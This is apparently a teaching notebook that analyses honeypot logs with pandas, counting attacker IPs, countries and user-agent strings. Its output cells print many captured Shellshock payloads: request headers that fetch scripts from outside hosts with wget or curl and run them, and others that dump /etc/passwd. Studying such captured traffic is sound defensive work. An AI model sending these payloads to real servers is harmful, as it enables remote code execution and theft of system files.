# %% [markdown]
# # Lab 2.1
#
# ## Introduction
# More timeseries analysis, but different data. Instead of flow data this lab will examine some data that was gathered from various honeypots. Three different honeypot packages were used to generate this data: Snort, Amun, and Glastopf. <a href="http://snort.org/">Snort</a> looks for patterns in network traffic and can be run in addition to the other types of honeypots. <a href="http://amunhoney.sourceforge.net/">Amun</a> is a low-interaction honeypot that listens on several ports and records connections to those ports. <a href="http://glastopf.org/">Glastopf</a> is another low-interaction honeypot that runs a web server and records client requests.
#
# Timeseries graphs and other exploration techniques will be used to understand the types and frequency of scans/attacks against the honeypot infrastructure.
# ___

# %% [markdown]
# ## Exercises
#
# ### File Input
# Instead of parsing a CSV file, the JSON output from *mongoexport* will be used.

# %%
import pandas as pd
import json

# %% [markdown]
# Execute the following cell to read in one JSON entry from *mongoexport*.

# %%
df = pd.read_json("./1.json")

# %% [markdown]
# What does the data look like? Is it in a usable format?

# %%
df
# Out:
#                             _id          channel  \
# $date                       NaN  glastopf.events
# $oid   5426456e9f8c6d41306aea57  glastopf.events
#
#                                       ident normalized  \
# $date  a16f5f36-3c41-11e4-9ee4-0a0b6e7c3e9e       True
# $oid   a16f5f36-3c41-11e4-9ee4-0a0b6e7c3e9e       True
#
#                                                  payload  \
# $date  {"pattern": "style_css", "time": "2014-09-27 0...
# $oid   {"pattern": "style_css", "time": "2014-09-27 0...
#
#                           timestamp
# $date  2014-09-27T05:04:46.363+0000
# $oid                            NaN

# %% [markdown]
# Since the data doesn't quite look ready-to-use one of IPython's other features of loading an external Python script can be used to fire up some parsing code. In the following cell use the **%load** magic word, and the file you'll want to load is *readhoneydata.py*.

# %%
# %load readhoneydata.py

# %%
f = open('./honeypot.json', 'r')
count = 0
glastopf = []
amun = []
snort = []
for line in f:
    j = json.loads(line)
    temp = []
    temp.append(j["_id"]["$oid"])
    temp.append(j["ident"])
    temp.append(j["normalized"])
    temp.append(j["timestamp"]["$date"])
    temp.append(j["channel"])
    payload = json.loads(j["payload"])
    if j["channel"] == "glastopf.events":
        temp.append(payload["pattern"])
        temp.append(payload["filename"])
        temp.append(payload["request_raw"])
        temp.append(payload["request_url"])
        temp.append(payload["source"][0])
        temp.append(payload["source"][1])
        glastopf.append(temp)
    elif j["channel"] == "amun.events":
        temp.append(payload["attackerIP"])
        temp.append(payload["attackerPort"])
        temp.append(payload["victimIP"])
        temp.append(payload["victimPort"])
        temp.append(payload["connectionType"])
        amun.append(temp)
    elif j["channel"] == "snort.alerts":
        temp.append(payload["source_ip"])
        if "source_port" in payload:
            temp.append(payload["source_port"])
        else:
            temp.append("0")
        temp.append(payload["destination_ip"])
        if "destination_port" in payload:
            temp.append(payload["destination_port"])
        else:
            temp.append("0")
        temp.append(payload["signature"])
        temp.append(payload["classification"])
        temp.append(payload["proto"])
        snort.append(temp)
    else:
        print j
f.close()

# %%
f = open('./honeypot.json', 'r')
count = 0
glastopf = []
amun = []
snort = []
for line in f:
    j = json.loads(line)
    temp = []
    temp.append(j["_id"]["$oid"])
    temp.append(j["ident"])
    temp.append(j["normalized"])
    temp.append(j["timestamp"]["$date"])
    temp.append(j["channel"])
    payload = json.loads(j["payload"])
    if j["channel"] == "glastopf.events":
        temp.append(payload["pattern"])
        temp.append(payload["filename"])
        temp.append(payload["request_raw"])
        temp.append(payload["request_url"])
        temp.append(payload["source"][0])
        temp.append(payload["source"][1])
        glastopf.append(temp)
    elif j["channel"] == "amun.events":
        temp.append(payload["attackerIP"])
        temp.append(payload["attackerPort"])
        temp.append(payload["victimIP"])
        temp.append(payload["victimPort"])
        temp.append(payload["connectionType"])
        amun.append(temp)
    elif j["channel"] == "snort.alerts":
        temp.append(payload["source_ip"])
        if "source_port" in payload:
            temp.append(payload["source_port"])
        else:
            temp.append("0")
        temp.append(payload["destination_ip"])
        if "destination_port" in payload:
            temp.append(payload["destination_port"])
        else:
            temp.append("0")
        temp.append(payload["signature"])
        temp.append(payload["classification"])
        temp.append(payload["proto"])
        snort.append(temp)
    else:
        print j
f.close()

# %% [markdown]
# Quickly build the dataframes from the lists of lists.

# %%
amun_df = pd.DataFrame(amun, columns=['id','ident','normalized','timestamp','channel','attackerIP','attackerPort','victimIP','victimPort','connectionType'])
glastopf_df = pd.DataFrame(glastopf, columns=['id','ident','normalized','timestamp','channel','pattern','filename','request_raw','request_url','attackerIP','attackerPort'])
snort_df = pd.DataFrame(snort, columns=['id','ident','normalized','timestamp','channel','attackerIP','attackerPort','victimIP','victimPort','signature','classification','proto'])

# %% [markdown]
# Check out the dataframes (amun_df, glastopf_df, and snort_df) and get a quick feel to see the types of data in them.
#
# **Hint**: Try running the **head()** and **dtypes** functions on the dataframes.

# %%
amun_df.dtypes
# Out:
# id                object
# ident             object
# normalized          bool
# timestamp         object
# channel           object
# attackerIP        object
# attackerPort       int64
# victimIP          object
# victimPort         int64
# connectionType    object
# dtype: object

# %% [markdown]
# ### Data Cleanup
# **SPOILER ALERT**
#
# Since the timestamp column isn't a datetime data type we need to fix that. Below is an example that shows what had to be done to the amun dataframe, add in the glastopf and snort ones as well.

# %%
amun_df['timestamp'] = amun_df['timestamp'].apply(lambda x: str(x).replace('T', 'T '))
glastopf_df['timestamp'] = glastopf_df['timestamp'].apply(lambda x: str(x).replace('T', 'T '))
snort_df['timestamp'] = snort_df['timestamp'].apply(lambda x: str(x).replace('T', 'T '))

# %%
amun_df['timestamp'] = pd.to_datetime(amun_df['timestamp'])
glastopf_df['timestamp'] = pd.to_datetime(glastopf_df['timestamp'])
snort_df['timestamp'] = pd.to_datetime(snort_df['timestamp'])

# %% [markdown]
# Don't forget to double check that the timestamp column is now a datetime object type.
#
# ### Data Augmentation
# 1. Add a column to *glastopf_df* called *victimPort* and assign it the value **80**.
# 2. Add country name to all three dataframes by using the GeoIP module, one example has already been provided.
#
# This product includes GeoLite2 data created by MaxMind, available from <a href="http://www.maxmind.com">http://www.maxmind.com</a>.

# %%
import GeoIP

gi = GeoIP.new(GeoIP.GEOIP_MEMORY_CACHE)

amun_df['attackerCountry'] = amun_df['attackerIP'].apply(lambda x: gi.country_name_by_addr(x))
glastopf_df['attackerCountry'] = glastopf_df['attackerIP'].apply(lambda x: gi.country_name_by_addr(x))
snort_df['attackerCountry'] = snort_df['attackerIP'].apply(lambda x: gi.country_name_by_addr(x))

glastopf_df['victimPort'] = 80

# %% [markdown]
# Create a new dataframe that has some common information from the other three dataframes.

# %%
cols = ['channel','timestamp','attackerIP','victimPort','attackerCountry']
attacker_df = pd.DataFrame()
attacker_df = attacker_df.append(snort_df[cols], ignore_index=True)
attacker_df = attacker_df.append(amun_df[cols], ignore_index=True)
attacker_df = attacker_df.append(glastopf_df[cols], ignore_index=True)

# %% [markdown]
# ### Reindex
# Using what you learned in the first part of the lab set the index for the *attacker_df* to the *timestamp* column.

# %%
attacker_df = attacker_df.set_index('timestamp')

# %% [markdown]
# ### Basic Exploration
# What are the top 10 most active IPs in the *attacker_df*? What honeypot type picked up this attacker, and what port(s) was this attacker especially fond of.
#
# **Hint** Incase you forgot, the honeypot type is stored in the *channel* column, and the port(s) are stored in the *victimPort* column.

# %%
attacker_df['attackerIP'].value_counts()
# Out:
# 61.153.106.24      50212
# 71.190.176.162      9518
# 74.91.25.122        6386
# 194.63.142.218      5125
# 1.34.22.39          5036
# 204.188.195.74      4129
# 104.171.112.125     3713
# 37.203.214.134      3412
# 71.179.27.162       2754
# 220.244.146.163     2275
# 50.243.3.241        2274
# 110.143.3.123       2271
# 201.232.0.40        2181
# 108.61.19.157       1850
# 217.11.61.195       1764
# ...
# 113.238.166.119    1
# 79.47.39.233       1
# 213.153.154.248    1
# 101.17.160.102     1
# 58.18.177.235      1
# 58.188.145.12      1
# 179.25.37.132      1
# 111.75.29.206      1
# 124.106.83.179     1
# 123.160.209.127    1
# 58.176.132.164     1
# 114.230.76.60      1
# 117.69.60.27       1
# 222.94.160.2       1
# 118.69.69.202      1
# Length: 16682, dtype: int64

# %%
print attacker_df[attacker_df['attackerIP'] == '61.153.106.24']['channel'].unique()
amun_df[amun_df['attackerIP'] == '61.153.106.24']['victimPort'].unique()
# Out:
# [u'amun.events']
# array([135])

# %% [markdown]
# This is one way that values can be pulled out from other column values. In this instance a new column called *user-agent* is created from the header captured in the Glastopf honeypot.

# %%
import re

regex = re.compile('.*[Uu][Ss][Ee][Rr]-[Aa][Gg][Ee][Nn][Tt]:(.*?)(?:\\r|$)')
glastopf_df['user-agent'] = glastopf_df['request_raw'].apply(lambda x: re.search(regex, x).group(1) if re.search(regex, x) else None)

# %% [markdown]
# What are some of the more popular user-agent strings? Find any interesting patterns?

# %%
glastopf_df['user-agent'].value_counts()
# Out:
#  curl/7.30.0                                                    694
#  () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl    619
#  Mozilla/3.0 (compatible; Indy Library)                         251
#  Mozilla/5.0                                                    106
#  Cloud mapping experiment. Contact research@pdrlabs.net          95
#  ZmEu                                                            92
#  Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01 [en]     64
#  Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)     63
#  Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)     45
#  masscan/1.0 (https://github.com/robertdavidgraham/masscan)      35
#  Python-urllib/2.6                                               32
#  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36     32
#  () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://tecnoalianza.com/hs.txt -O /tmp/hs.txt;curl -O /tmp/hs.txt http://tecnoalianza.com/hs.txt;perl /tmp/hs.txt;rm -rf /tmp/hs.txt*");'     31
#  () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/durex.pl -O /tmp/durex.pl;curl -O /tmp/durex.pl http://202.191.121.230/durex.pl;perl /tmp/durex.pl;rm -rf /tmp/durex.pl*");'     28
#  () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh     27
# ...
#  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36    1
#  Mozilla/5.0 (Windows NT 7.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0.1    1
#  Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0    1
#  Mozilla/5.0 MetaIntelligence                                   1
#  Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/9.0.625.79 Safari/537.36    1
#  Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0    1
#  () { :; }; /bin/bash -c "rm -rf /tmp/*;echo wget http://121.12.173.173:81/9521 -O /tmp/China.Z-arpo  >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-arpo  >> /tmp/Run.sh;echo /tmp/China.Z-arpo  >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh"    1
#  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"    1
#  () { :; }; echo X-Bash-Test: `echo glXpsoaBEf`;                1
#  Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0)    1
#  Mozilla/5.0 (Windows NT 5.1; rv:22.0) Gecko/20100101 Firefox/22.0    1
#  InetURL:/1.0                                                   1
#  HTTP_Request2/0.5.2 (http://pear.php.net/package/http_request2) PHP/5.2.5    1
#  () { :;}; echo Content-Type: text/plain ; echo "TEST: TEST"    1
#  Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20140610 Firefox/24.0 PaleMoon/24.6.2    1
# Length: 122, dtype: int64

# %% [markdown]
# When you've found some patterns worth exploring, what else can you come up with.
#
# You can use the **str.contains()** function to see what rows contain a specific substring. One example has been provided, the query in the cell below is an easy way to query for all entries that may contain a shellshock exploit attempt.

# %%
glastopf_df[glastopf_df['request_raw'].str.contains('{ :;}')]['request_raw'].value_counts()
# Out:
# GET /cgi-bin/fire.cgi HTTP/1.0\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;}; /bin/bash -c "cd /var/tmp;wget http://184.171.247.165/wi;curl -O http://184.171.247.165/wi;perl wi;rm -rf wi"    2
# GET / HTTP/1.0\r\nAccept: */*\r\nUser-Agent: () { :;}; echo BANG: $(cat /etc/passwd)    2
# GET / HTTP/1.0\r\nAccept: */*\r\nReferer: () { :;}; echo "BigBang: " $(</etc/passwd)\r\nUser-Agent: () { :;}; echo "BigBang: " $(</etc/passwd)    1
# GET /cgi-bin/hello.cgi HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://tecnoalianza.com/hs.txt -O /tmp/hs.txt;curl -O /tmp/hs.txt http://tecnoalianza.com/hs.txt;perl /tmp/hs.txt;rm -rf /tmp/hs.txt*");'    1
# GET /cgi-bin/main.cgi HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://tecnoalianza.com/hs.txt -O /tmp/hs.txt;curl -O /tmp/hs.txt http://tecnoalianza.com/hs.txt;perl /tmp/hs.txt;rm -rf /tmp/hs.txt*");'    1
# GET /cgi-bin/contact.cgi HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://tecnoalianza.com/hs.txt -O /tmp/hs.txt;curl -O /tmp/hs.txt http://tecnoalianza.com/hs.txt;perl /tmp/hs.txt;rm -rf /tmp/hs.txt*");'    1
# GET /cgi-sys/php5 HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/durex.pl -O /tmp/durex.pl;curl -O /tmp/durex.pl http://202.191.121.230/durex.pl;perl /tmp/durex.pl;rm -rf /tmp/durex.pl*");'    1
# GET HTTP/1.1 HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://gilbertsoto.com/t3.log -O /tmp/t3.log;curl -O /tmp/t3.log http://gilbertsoto.com/t3.log;perl /tmp/t3.log;rm -rf /tmp/t3.log*");'    1
# GET /cgi-bin/env.cgi HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://tecnoalianza.com/hs.txt -O /tmp/hs.txt;curl -O /tmp/hs.txt http://tecnoalianza.com/hs.txt;perl /tmp/hs.txt;rm -rf /tmp/hs.txt*");'    1
# GET /cgi-bin/hello.cgi HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/mzer.pl -O /tmp/mzer.pl;curl -O /tmp/mzer.pl http://202.191.121.230/mzer.pl;perl /tmp/mzer.pl;rm -rf /tmp/mzer.pl*");'    1
# GET /cgi-bin/btw.cgi HTTP/1.0\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;}; /bin/bash -c "cd /var/tmp ; rm -rf sa* ; wget http://100.42.30.34/lex1 ; lwp-download http://100.42.30.34/lex1 ; curl -O /var/tmp/lex1 http://100.42.30.34/lex1 ; perl /var/tmp/lex1 ; rm -rf /var/tmp/lex*;rm -rf lex1"    1
# GET /cgi-bin/php5 HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://play.marketplay.eu/apache23 -O /tmp/apache23;curl -O /tmp/apache23 http://play.marketplay.eu/apache23;chmod 777 /tmp/apache23;cd /tmp/;./apache23 &");'    1
# GET / HTTP/1.0\r\nAccept: */*\r\nConnection: Keep-Alive\r\nHost: 54.68.96.53\r\nReferer: () { :;}; /bin/bash -c "wget -O /tmp/bbb www.redel.net.br/1.php?id=35342e36382e39362e3533"\r\nUser-Agent: () { :;}; /bin/bash -c "wget -O /tmp/bbb www.redel.net.br/1.php?id=35342e36382e39362e3533"    1
# GET /cgi-bin/sat-ir-web.pl HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://tecnoalianza.com/hs.txt -O /tmp/hs.txt;curl -O /tmp/hs.txt http://tecnoalianza.com/hs.txt;perl /tmp/hs.txt;rm -rf /tmp/hs.txt*");'    1
# GET /phppath/cgi_wrapper HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/durex.pl -O /tmp/durex.pl;curl -O /tmp/durex.pl http://202.191.121.230/durex.pl;perl /tmp/durex.pl;rm -rf /tmp/durex.pl*");'    1
# ...
# GET /cgi-bin/php5 HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://tecnoalianza.com/hs.txt -O /tmp/hs.txt;curl -O /tmp/hs.txt http://tecnoalianza.com/hs.txt;perl /tmp/hs.txt;rm -rf /tmp/hs.txt*");'    1
# GET / HTTP/1.0\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;}; /bin/bash -c "wget http://stablehost.us/bots/regular.bot -O /tmp/sh;curl -o /tmp/sh http://stablehost.us/bots/regular.bot;sh /tmp/sh;rm -rf /tmp/sh"    1
# GET /cgi-sys/entropysearch.cgi HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://play.marketplay.eu/apache23 -O /tmp/apache23;curl -O /tmp/apache23 http://play.marketplay.eu/apache23;chmod 777 /tmp/apache23;cd /tmp/;./apache23 &");'    1
# GET /cgi-sys/php5 HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://gilbertsoto.com/t3.log -O /tmp/t3.log;curl -O /tmp/t3.log http://gilbertsoto.com/t3.log;perl /tmp/t3.log;rm -rf /tmp/t3.log*");'    1
# GET HTTP/1.1 HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://tecnoalianza.com/hs.txt -O /tmp/hs.txt;curl -O /tmp/hs.txt http://tecnoalianza.com/hs.txt;perl /tmp/hs.txt;rm -rf /tmp/hs.txt*");'    1
# GET /cgi-bin/test.cgi HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://tecnoalianza.com/hs.txt -O /tmp/hs.txt;curl -O /tmp/hs.txt http://tecnoalianza.com/hs.txt;perl /tmp/hs.txt;rm -rf /tmp/hs.txt*");'    1
# GET /cgi-bin/bts.cgi HTTP/1.0\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;}; /bin/bash -c "cd /tmp;wget http://100.42.30.34/lex ; curl -O http://100.42.30.34/lex ; perl lex ;rm -rf lex"    1
# GET /cgi-bin/meme.cgi HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/durex.pl -O /tmp/durex.pl;curl -O /tmp/durex.pl http://202.191.121.230/durex.pl;perl /tmp/durex.pl;rm -rf /tmp/durex.pl*");'    1
# GET /phppath/php HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/durex.pl -O /tmp/durex.pl;curl -O /tmp/durex.pl http://202.191.121.230/durex.pl;perl /tmp/durex.pl;rm -rf /tmp/durex.pl*");'    1
# GET /cgi-bin/test.cgi HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/mzer.pl -O /tmp/mzer.pl;curl -O /tmp/mzer.pl http://202.191.121.230/mzer.pl;perl /tmp/mzer.pl;rm -rf /tmp/mzer.pl*");'    1
# GET /cgi-bin/recent.cgi HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://tecnoalianza.com/hs.txt -O /tmp/hs.txt;curl -O /tmp/hs.txt http://tecnoalianza.com/hs.txt;perl /tmp/hs.txt;rm -rf /tmp/hs.txt*");'    1
# GET HTTP/1.1 HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/mzer.pl -O /tmp/mzer.pl;curl -O /tmp/mzer.pl http://202.191.121.230/mzer.pl;perl /tmp/mzer.pl;rm -rf /tmp/mzer.pl*");'    1
# GET /cgi-bin/bash HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://tecnoalianza.com/hs.txt -O /tmp/hs.txt;curl -O /tmp/hs.txt http://tecnoalianza.com/hs.txt;perl /tmp/hs.txt;rm -rf /tmp/hs.txt*");'    1
# GET /cgi-bin/fire.cgi HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/durex.pl -O /tmp/durex.pl;curl -O /tmp/durex.pl http://202.191.121.230/durex.pl;perl /tmp/durex.pl;rm -rf /tmp/durex.pl*");'    1
# GET / HTTP/1.1\r\nHost: 162.197.24.67\r\nUser-Agent: () { :;}; /bin/bash -c "echo testing9123123"; /bin/uname -a    1
# Length: 111, dtype: int64

# %%
glastopf_df[glastopf_df['request_raw'].str.contains('};')]['request_raw'].value_counts()
# Out:
# GET / HTTP/1.0\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nCookie: () { :; }; curl http://www.ykum.com//bbs/skin/zero_vote/cpan_root | perl\r\nPragma: no-cache\r\nReferer: () { :; }; curl http://www.ykum.com//bbs/skin/zero_vote/cpan_root | perl\r\nTest: () { :; }; curl http://www.ykum.com//bbs/skin/zero_vote/cpan_root | perl\r\nUser-Agent: () { :; }; curl http://www.ykum.com//bbs/skin/zero_vote/cpan_root | perl    5
# GET /cgi-bin/w3mman2html.cgi HTTP/1.0\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nPragma: no-cache\r\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl    4
# GET /cgi-bin/test-cgi HTTP/1.0\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nPragma: no-cache\r\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl    4
# GET /cgi-bin/mail/nph-mr.cgi HTTP/1.0\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nPragma: no-cache\r\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl    3
# GET /cgi-bin/cartmanager.cgi HTTP/1.0\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nPragma: no-cache\r\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl    3
# GET /cgi-bin/simplestguest.cgi HTTP/1.0\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nPragma: no-cache\r\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl    3
# GET /cgi-bin/sojourn.cgi HTTP/1.0\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nPragma: no-cache\r\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl    3
# GET /cgi-bin/dbman/db.cgi HTTP/1.0\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nPragma: no-cache\r\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl    3
# GET /cgi-bin/af.cgi HTTP/1.0\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nPragma: no-cache\r\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl    3
